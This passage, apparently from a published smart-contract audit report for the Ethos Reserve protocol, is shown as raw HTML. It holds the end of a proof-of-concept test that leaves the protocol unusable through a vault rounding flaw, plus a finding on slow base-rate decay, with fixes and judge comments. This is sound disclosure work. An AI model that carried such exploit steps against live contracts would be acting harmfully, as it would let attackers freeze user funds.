class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">3</span><span class=\"mtk1\">, </span><span class=\"mtk7\">6</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">th</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_100pct</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">90</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        { </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Protocol is now unusable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">assertRevert</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTrove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">assertRevert</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">closeTrove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">assertRevert</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openTrove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">190</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">th</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_100pct</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">dec</span><span class=\"mtk1\">(</span><span class=\"mtk7\">90</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">carol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">carol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          { </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">carol</span><span class=\"mtk1\"> }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Hardhat/Truffle, VSCode</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Changing ReaperVaultERC4626 withdraw to round down instead of up fixes this issue. Below is the fixed code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) / </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246#issuecomment-1470866404\">0xBebis (Ethos Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>This doesn’t seem like a reasonable attack vector, but definitely good to know. I think it should be downgraded to low. In my opinion, changing the implementation carries far greater risk than the potential for this DOS.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246#issuecomment-1476108588\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this vector qualifies for medium. Warden has stated the conditions for the attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246#issuecomment-1476647830\">0xBebis (Ethos Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We’ll confirm this as medium, we’re just going to remove the ERC4626 interface since this will be a private vault.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-lastfeeoperationtime-is-not-modified-correctly-in-function-_updatelastfeeoptime-resulting-a-much-slower-decay-model-for-borrowing-base-rate\" style=\"position:relative;\"><a href=\"#m-14-lastfeeoperationtime-is-not-modified-correctly-in-function-_updatelastfeeoptime-resulting-a-much-slower-decay-model-for-borrowing-base-rate\" aria-label=\"m 14 lastfeeoperationtime is not modified correctly in function _updatelastfeeoptime resulting a much slower decay model for borrowing base rate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/33\">[M-14] <code>lastFeeOperationTime</code> is not modified correctly in function <code>_updateLastFeeOpTime()</code>, resulting a much slower decay model for borrowing base rate</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/33\">chaduke</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/850\">d3e4</a></em></p>\n<p><code>lastFeeOperationTime</code> is not modified correctly in function <code>_updateLastFeeOpTime()</code>. As a result, <code>decayBaseRateFromBorrowing()</code>  will decay the base rate more slowly than expected (worst case half slower).</p>\n<p>Since borrowing base rate is so fundamental to the protocol, I would rate this finding as High.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We show how <code>decayBaseRateFromBorrowing()</code>  will decay the base rate more slowly than expected because of the wrong modification of <code>lastFeeOperationTime</code> in <code>_updateLastFeeOpTime()</code>:</p>\n<ol>\n<li><code>decayBaseRateFromBorrowing()</code>  calls <code>_calcDecayedBaseRate()</code> to calculate the decayed base rate based how many minutes elapsed since last recorded <code>lastFeeOperationTime</code>.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decayBaseRateFromBorrowing</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireCallerIsBorrowerOperations</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decayedBaseRate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_calcDecayedBaseRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decayedBaseRate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// The baseRate can decay to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">baseRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">decayedBaseRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BaseRateUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decayedBaseRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_updateLastFeeOpTime</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calcDecayedBaseRate</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutesPassed</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_minutesPassedSinceLastFeeOp</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decayFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">LiquityMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_decPow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINUTE_DECAY_FACTOR</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minutesPassed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseRate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decayFactor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_minutesPassedSinceLastFeeOp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastFeeOperationTime</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SECONDS_IN_ONE_MINUTE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span></code></pre>\n<ol start=\"2\">\n<li><code>decayBaseRateFromBorrowing()</code>  then calls <code>_updateLastFeeOpTime()</code> to set <code>lastFeeOperationTime</code> to the current time if at least 1 minute pass.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateLastFeeOpTime</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timePassed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastFeeOperationTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timePassed</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">SECONDS_IN_ONE_MINUTE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">lastFeeOperationTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LastFeeOpTimeUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ol start=\"3\">\n<li>The problem with such an update of <code>lastFeeOperationTime</code> is, if 1.999 minutes had passed, the base rate will only decay for 1 minute, at the same time, 1.999 minutes will be added on<code>lastFeeOperationTime</code>. In other words, in a worst scenario, for every 1.999 minutes, the base rate will only decay for 1 minute. Therefore, the base rate will decay more slowly then expected.</li>\n<li>The borrowing base rate is very fundamental to the whole protocol. Any small deviation is  accumulative. In the worse case, the decay speed will slow down by half; on average, it will be 0.75 slower.</li>\n</ol>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Using  the effective elapsed time that is consumed by the model so far to revise <code>lastFeeOperationTime</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> function _updateLastFeeOpTime() internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint timePassed = block.timestamp.sub(lastFeeOperationTime);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (timePassed &gt;= SECONDS_IN_ONE_MINUTE) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            lastFeeOperationTime = block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            lastFeeOperationTime += _minutesPassedSinceLastFeeOp()*SECONDS_IN_ONE_MINUTE;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            emit LastFeeOpTimeUpdated(block.timestamp);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/33#issuecomment-1459979239\">Trust (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/850#issuecomment-1467100475\">tess3rac7 (Ethos Reserve) disputed via duplicate issue <code>#850</code></a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 68 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/672\">report highlighted below</a> by <strong>GalloDaSballo</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/840\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/839\">SleepingBugs</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/830\">Raiders</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/828\">Josiah</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/824\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/820\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/817\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/794\">Lavishq</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/773\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/765\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/762\">PawelK</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/760\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/748\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/745\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/742\">tsvetanovv</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/734\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/721\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/720\">brgltd</a>, <a 